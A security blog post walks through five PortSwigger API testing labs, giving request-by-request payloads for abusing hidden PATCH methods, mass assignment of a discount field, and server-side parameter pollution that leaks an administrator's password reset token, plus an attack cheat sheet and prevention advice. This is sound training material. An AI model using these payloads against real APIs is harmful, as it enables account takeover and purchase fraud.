---
title: "PortSwigger API Testing Labs — Complete Walkthrough"
date: 2026-09-22 07:40:00 +0000
categories: [Web Penetration Testing]
tags: [API Testing, PortSwigger, Web Security Academy, Mass Assignment, SSPP]
description: "All 5 PortSwigger API testing labs: undocumented endpoints, unused API methods, mass assignment and server-side parameter pollution in query strings and REST URLs."
author: Paschal Sangawe
toc: true
---

APIs are where modern applications hide their real attack surface. The front-end only calls a subset of the endpoints and methods that actually exist, and those hidden ones often lack the authorization that the UI implies. This topic also covers **server-side parameter pollution (SSPP)** — tricking an internal API by smuggling extra parameters into the request it builds for you.

This post covers all **5 PortSwigger API testing labs**. It maps closely to OWASP API Security Top 10 items such as API9 (Improper Inventory Management) and API3 (Broken Object Property Level Authorization).

## Lab 1 — Exploiting an API endpoint using documentation
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `carlos`.
> _Save as_ `images/portswigger-api-testing-labs/1.png` _then replace this block with_ `![Lab 1 — Exploiting an API endpoint using documentation](/images/portswigger-api-testing-labs/1.png)`_._


**Difficulty:** Apprentice
**Goal:** Find the API documentation and use it to delete `carlos`.

Applications often expose machine-readable or interactive documentation that reveals hidden endpoints.

**Steps**

1. Log in as `wiener:peter` and update your email address (this triggers the `PATCH /api/user/wiener` request).
2. Send `PATCH /api/user/wiener` to Repeater — it returns credentials for `wiener`.
3. Trim the path: request `PATCH /api/user` → an error about a missing user identifier, confirming the route is parameterised.
4. Trim again: request `PATCH /api` → this returns **API documentation**.
5. Right-click the response → *Show response in browser*, copy the URL, and open it. The documentation is interactive.
6. Click the `DELETE` row, enter `carlos`, and click **Send request**.

> **Picture goes here (#2).** The generated API documentation with the DELETE action for `carlos`.
> _Save as_ `images/portswigger-api-testing-labs/2.png` _then replace this block with_ `![Lab 1 — Exploiting an API endpoint using documentation](/images/portswigger-api-testing-labs/2.png)`_._

**Lesson:** enumerate documentation paths (`/api`, `/swagger`, `/openapi.json`, `/api-docs`) and trim path segments to find parent endpoints.

## Lab 2 — Finding and exploiting an unused API endpoint
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `Content-Type: application/json`.
> _Save as_ `images/portswigger-api-testing-labs/3.png` _then replace this block with_ `![Lab 2 — Finding and exploiting an unused API endpoint](/images/portswigger-api-testing-labs/3.png)`_._


**Difficulty:** Practitioner
**Goal:** Buy an expensive product for free by abusing an unused `PATCH` method.

**Steps**

1. Open a product and find its price API request, e.g. `GET /api/products/3/price`.
2. Send it to Repeater and switch the method to `OPTIONS`. The response advertises that **`GET` and `PATCH`** are allowed.
3. Switch to `PATCH` → `Unauthorized`. So authentication is required.
4. Log in as `wiener:peter`.
5. Find the leather jacket's request, `GET /api/products/1/price`, and send it to Repeater.
6. Change the method to `PATCH` → error about the `Content-Type`. Add:

```http
Content-Type: application/json
```

7. Send an empty JSON object `{}` → error that `price` is missing.
8. Send `{"price":0}`.
9. Reload the product page — the price is now `$0.00`. Add it to the basket and place the order.

> **Picture goes here (#4).** The `PATCH /api/products/1/price` request setting `{"price":0}` and the free checkout.
> _Save as_ `images/portswigger-api-testing-labs/4.png` _then replace this block with_ `![Lab 2 — Finding and exploiting an unused API endpoint](/images/portswigger-api-testing-labs/4.png)`_._

**Lesson:** enumerate HTTP methods with `OPTIONS`/`OPTIONS *`, and never rely on the UI to define what a resource supports. Price/write endpoints must enforce authorization and validation server-side.

## Lab 3 — Exploiting a mass assignment vulnerability
> **Picture goes here (#5).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `{`.
> _Save as_ `images/portswigger-api-testing-labs/5.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/5.png)`_._


**Difficulty:** Practitioner
**Goal:** Get a 100% discount by injecting a parameter the front-end never sends.

Mass assignment happens when the server binds all submitted JSON fields to an object without an allow-list, so hidden properties become writable.

**Steps**

1. Log in as `wiener:peter`, add the leather jacket to the basket, and attempt checkout — you lack credit.
2. In proxy history, observe both `GET` and `POST /api/checkout`.
3. The `GET` response reveals a `chosen_discount` property that the `POST` request never sends.
4. Send `POST /api/checkout` to Repeater and add the hidden field:

```json
{
  "chosen_discount": {
    "percentage": 0
  },
  "chosen_products": [
    {
      "product_id": "1",
      "quantity": 1
    }
  ]
}
```

5. Send it — no error, so the field is accepted.
6. Set `percentage` to the string `"x"` → a validation error, proving the value is processed.
7. Set `percentage` to `100` and send → the order succeeds for free.

> **Picture goes here (#6).** The mass-assigned `chosen_discount` request and the successful discount.
> _Save as_ `images/portswigger-api-testing-labs/6.png` _then replace this block with_ `![Lab 3 — Exploiting a mass assignment vulnerability](/images/portswigger-api-testing-labs/6.png)`_._

**Lesson:** never bind request JSON directly onto internal objects; use explicit DTOs/allow-lists of writable fields.

## Lab 4 — Exploiting server-side parameter pollution in a query string
> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator               → normal response`.
> _Save as_ `images/portswigger-api-testing-labs/7.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/7.png)`_._


**Difficulty:** Practitioner
**Goal:** Inject an internal `field` parameter to leak the admin's password reset token and take over the account.

The `POST /forgot-password` handler builds an internal API request using your `username`, without escaping it. We can smuggle additional query parameters.

**Probing the internal API**

```text
username=administrator               → normal response
username=administratorx              → "Invalid username"
username=administrator%26x=y         → "Parameter is not supported"   (the & split our input into a new param)
username=administrator%23            → "Field not specified"          (the # truncated a hidden "field" param)
username=administrator%26field=x%23  → "Invalid field"
```

The internal request is something like `GET /internal/v1/users?username=<input>&field=<field>`. We can override `field`.

**Finding a valid field value** — send to Intruder with a payload position on the value of `field` and use the built-in **Server-side variable names** list:

```text
username=administrator%26field=§x§%23
```

Both `username` and `email` return 200. Then request the reset token field:

```text
username=administrator%26field=reset_token%23
```

The response now contains the administrator's **reset token**. Browse to the reset endpoint from `/static/js/forgotPassword.js`:

```text
/forgot-password?reset_token=123456789
```

Set a new password, log in as administrator, and delete `carlos`.

> **Picture goes here (#8).** The `field=reset_token` response leaking the admin token and the password reset page.
> _Save as_ `images/portswigger-api-testing-labs/8.png` _then replace this block with_ `![Lab 4 — Exploiting server-side parameter pollution in a query string](/images/portswigger-api-testing-labs/8.png)`_._

## Lab 5 — Exploiting server-side parameter pollution in a REST URL
> **Picture goes here (#9).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `username=administrator#      → "Invalid route"        (# truncates the path)`.
> _Save as_ `images/portswigger-api-testing-labs/9.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/9.png)`_._


**Difficulty:** Expert
**Goal:** Same account takeover, but the injection point is a REST **path**.

Here the `username` is placed in the *path* of the internal request without escaping.

**Probing**

```text
username=administrator#      → "Invalid route"        (# truncates the path)
username=administrator?      → "Invalid route"        (starts a query string)
username=./administrator     → normal response        (same path)
username=../administrator    → "Invalid route"        (parent path)
```

**Escaping the API root to read its definition**

```text
username=../%23
username=../../../../%23                                  → "Not found" (outside API root)
username=../../../../openapi.json%23                      → leaks the API definition
```

The definition reveals:

```text
/api/internal/v1/users/{username}/field/{field}
```

**Injecting the `field` path parameter**

```text
username=administrator/field/foo%23                → error (only "email" supported)
username=administrator/field/email%23              → normal response
```

`passwordResetToken` is rejected because the application pins an older API **version**:

```text
username=administrator/field/passwordResetToken%23 → error
```

Force the API version from the path:

```text
username=../../v1/users/administrator/field/passwordResetToken%23
```

This returns the reset token. Use the JS-identified endpoint:

```text
/forgot-password?passwordResetToken=<token>
```

Set a new admin password, log in, and delete `carlos`.

> **Picture goes here (#10).** The `openapi.json` leak and the version-overridden `passwordResetToken` response.
> _Save as_ `images/portswigger-api-testing-labs/10.png` _then replace this block with_ `![Lab 5 — Exploiting server-side parameter pollution in a REST URL](/images/portswigger-api-testing-labs/10.png)`_._

## API testing cheat sheet

| Technique | Probe |
|-----------|-------|
| Hidden docs | `/api`, `/swagger`, `/openapi.json`, trim path segments |
| Hidden methods | `OPTIONS` / `OPTIONS *`, then try `PATCH`/`PUT`/`DELETE` |
| Content type | Swap `Content-Type` (JSON ↔ XML) and body format |
| Hidden fields | Read `GET` responses; look for fields absent from `POST` |
| Mass assignment | Add those fields to the write request |
| SSPP (query) | `%26` to add params, `%23` to truncate |
| SSPP (path) | `./`, `../`, `?`, `%23`, then walk to `openapi.json` |
| Field discovery | Brute force with the "Server-side variable names" wordlist |

## Prevention

- Maintain a complete, accurate API **inventory**; deprecate and remove unused endpoints/methods rather than leaving them exposed.
- Enforce **authorization on every endpoint and method** — never assume the front-end is the only client.
- Bind request data to explicit **DTOs / allow-lists**; never auto-bind JSON onto internal objects (mass assignment).
- **Encode user input** before embedding it in server-side URLs, and have the internal API reject unexpected/duplicate parameters.
- Version APIs deliberately and gate sensitive fields (like reset tokens) behind authorization, not obscurity.

## Related posts

- [SSRF labs](/posts/portswigger-ssrf-labs/)
- [Information Disclosure labs](/posts/portswigger-information-disclosure-labs/)
- [OS Command Injection labs](/posts/portswigger-os-command-injection-labs/)
- [SQL Injection lab series](/posts/portswigger-sqli-part-1-basics/)
